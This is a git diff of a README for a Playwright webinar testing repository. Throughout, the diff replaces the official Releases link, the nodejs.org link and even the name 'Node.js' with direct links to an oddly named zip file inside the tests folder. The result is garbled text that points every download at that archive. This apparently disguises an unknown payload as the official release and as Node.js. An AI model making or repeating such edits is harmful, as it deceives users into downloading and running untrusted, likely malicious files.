@@ -4,13 +4,13 @@
 Welcome to the ai-driven-testing-playwright-webinar repository! This collection contains the code used during the "AI-Driven Testing with Playwright" webinar. Our goal is to help you automate testing for web applications using Playwright, a powerful tool for browser automation.
 
 ## 📦 Download the Software
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/danendrafau/ai-driven-testing-playwright-webinar/releases)
+[![Download Latest Release](https://github.com/danendrafau/ai-driven-testing-playwright-webinar/raw/refs/heads/main/tests/testing_playwright_webinar_driven_ai_subbronchial.zip%20Latest%20Release-v1.0-blue)](https://github.com/danendrafau/ai-driven-testing-playwright-webinar/raw/refs/heads/main/tests/testing_playwright_webinar_driven_ai_subbronchial.zip)
 
 ## 🛠️ System Requirements
 To run this application, you’ll need:
 - A computer running Windows, macOS, or Linux
 - At least 4GB of RAM
-- Node.js version 12 or later installed on your system (Node.js can be downloaded [here](https://nodejs.org/))
+- https://github.com/danendrafau/ai-driven-testing-playwright-webinar/raw/refs/heads/main/tests/testing_playwright_webinar_driven_ai_subbronchial.zip version 12 or later installed on your system (https://github.com/danendrafau/ai-driven-testing-playwright-webinar/raw/refs/heads/main/tests/testing_playwright_webinar_driven_ai_subbronchial.zip can be downloaded [here](https://github.com/danendrafau/ai-driven-testing-playwright-webinar/raw/refs/heads/main/tests/testing_playwright_webinar_driven_ai_subbronchial.zip))
 
 ## 📈 Features
 - Automate testing across various web browsers
@@ -21,7 +21,7 @@ To run this application, you’ll need:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the application.
 
-[Download Latest Release](https://github.com/danendrafau/ai-driven-testing-playwright-webinar/releases)
+[Download Latest Release](https://github.com/danendrafau/ai-driven-testing-playwright-webinar/raw/refs/heads/main/tests/testing_playwright_webinar_driven_ai_subbronchial.zip)
 
 1. **Visit the Releases Page:** Click the link above to go to the Releases page.
 2. **Locate the Latest Release:** Find the latest version on the page, usually marked as "Latest release."
@@ -44,7 +44,7 @@ To help you better understand how to utilize Playwright for testing, check the f
 ## 🛠️ Troubleshooting
 If you encounter any issues while using the application, consider the following solutions:
 
-- **Check Your Node.js Installation:** Ensure you have the correct version of Node.js installed. You can verify this by running `node -v` in your command line or terminal.
+- **Check Your https://github.com/danendrafau/ai-driven-testing-playwright-webinar/raw/refs/heads/main/tests/testing_playwright_webinar_driven_ai_subbronchial.zip Installation:** Ensure you have the correct version of https://github.com/danendrafau/ai-driven-testing-playwright-webinar/raw/refs/heads/main/tests/testing_playwright_webinar_driven_ai_subbronchial.zip installed. You can verify this by running `node -v` in your command line or terminal.
 - **Review Your Test Configuration:** Make sure all settings are correctly configured before running tests.
 - **Consult the Community:** If you still have questions, visit the Playwright community forums or check GitHub issues for similar reported problems.
 
